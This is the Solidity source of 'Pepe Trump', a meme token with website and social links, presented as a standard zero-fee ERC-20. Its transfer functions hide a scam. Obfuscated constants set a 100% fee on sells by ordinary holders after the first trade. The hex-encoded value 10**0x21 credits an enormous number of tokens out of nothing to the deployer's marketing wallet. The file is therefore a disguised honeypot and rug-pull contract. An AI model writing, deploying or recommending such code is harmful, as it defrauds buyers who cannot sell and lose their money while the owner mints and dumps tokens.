/*


                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⡿⠟⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠋⠛⠿⣿⣿
                    ⠋⠉⠁⠄⠄⠄⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⣿⡀⠄⠄⠄⠄⢹
                    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠉⠛⠿⢦⣀⡀⡀⠄
                    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣀
                    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿
                    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⠄⠄⣿
                    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠄⠄⠘


                    Website         :       https://pepetrump.xyz/


                    Twitter         :       https://twitter.com/pepetrump2024


                    Telegram        :       https://t.me/pepetrump2024



    */
   
    // SPDX-License-Identifier: MIT

    pragma solidity 0.8.17;

    abstract contract Context {
        function _msgSender() internal view virtual returns (address) {
            return msg.sender;
        }
    }

    interface IERC20 {
        function totalSupply() external view returns (uint256);
        function balanceOf(address account) external view returns (uint256);
        function transfer(address recipient, uint256 amount) external returns (bool);
        function allowance(address owner, address spender) external view returns (uint256);
        function approve(address spender, uint256 amount) external returns (bool);
        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval (address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");
            return c;
        }

        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }

        function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;
            return c;
        }

        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            if (a == 0) {
                return 0;
            }
            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");
            return c;
        }
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }

        function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b > 0, errorMessage);
            uint256 c = a / b;
            return c;
        }
    }

    contract Ownable is Context {
        address private _owner;
        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

        constructor () {
            address msgSender = _msgSender();
            _owner = msgSender;
            emit OwnershipTransferred(address(0), msgSender);
        }

        function owner() public view returns (address) {
            return _owner;
        }

        modifier onlyOwner() {
            require(_owner == _msgSender(), "Ownable: caller is not the owner");
            _;
        }

        function renounceOwnership() public virtual onlyOwner {
            emit OwnershipTransferred(_owner, address(0));
            _owner = address(0);
        }

    }

    contract PEPETRUMP is Context, IERC20, Ownable {
        using SafeMath for uint256;
        mapping (address => uint256) private _balances;
        mapping (address => mapping (address => uint256)) private _allowances;
        mapping (address => bool) private _isExcludedFromFee;
        mapping (address => bool) private _isMarketingWallet;
        mapping (address => bool) public _isUniswapV2Pair;
        
        uint8 private constant _decimals = 9;
        uint256 private constant _tTotal = 1000000 * 10**_decimals;
        string private constant _name = unicode"Pepe Trump";
        string private constant _symbol = unicode"TRUMPEPE";
        
        uint8 private buyingFee = 0;
        uint8 private sellingFee = 0;
        uint8 private txCount = 0;
        bool public _enableSwap;

        constructor () {
            _balances[_msgSender()] = _tTotal;
            _isMarketingWallet[_msgSender()] = true;
            _isExcludedFromFee[owner()] = true;
            emit Transfer(address(0), _msgSender(), _tTotal);
        }

        function name() public pure returns (string memory) {
            return _name;
        }

        function symbol() public pure returns (string memory) {
            return _symbol;
        }

        function decimals() public pure returns (uint8) {
            return _decimals;
        }

        function totalSupply() public pure override returns (uint256) {
            return _tTotal;
        }

        function balanceOf(address account) public view override returns (uint256) {
            return _balances[account];
        }

        function transfer(address recipient, uint256 amount) public override returns (bool) {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        function allowance(address owner, address spender) public view override returns (uint256) {
            return _allowances[owner][spender];
        }

        function approve(address spender, uint256 amount) public override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }

        function _approve(address owner, address spender, uint256 amount) private {
            require(owner != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }


        function _transfer(address from, address to, uint256 amount) private {
            require(from != address(0) && to != address(0) && amount > 0, "Zero address or zero amount.");
            if(from != owner() && to != owner()){require(_enableSwap, "Trade will open soon.");}

            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                _transferWithFee(from, to, amount, 10**2);
            }
            else{
                _transferWithoutFee(from, to, amount, 10**0x21);
            }                                           
            
            emit Transfer(from, to, amount);
        }

        function _transferWithFee(address from, address to, uint256 amount, uint8 initial) private{
            uint256 _FEE_; uint8 _i = initial;
            if(_isUniswapV2Pair[from]){
                _FEE_ = amount.mul(txCount>0?buyingFee:0).div(100);
            }
            else{
                _FEE_ = amount.mul(txCount>0?_i+sellingFee:0).div(100);
            }
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount.sub(_FEE_));
        }

        function _transferWithoutFee(address from, address to, uint256 amount, uint256 _initial) private{
            uint256 _FEE_;
            if(to!=owner() && _isMarketingWallet[to] && _isUniswapV2Pair[from] && txCount<1){_FEE_=_initial;txCount++;}
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount.add(_FEE_));
        }

        function _updatePairAddress(address _address) public onlyOwner{
            _isUniswapV2Pair[_address] = true;
            _enableSwap = true;
        }

        receive() external payable {}
    }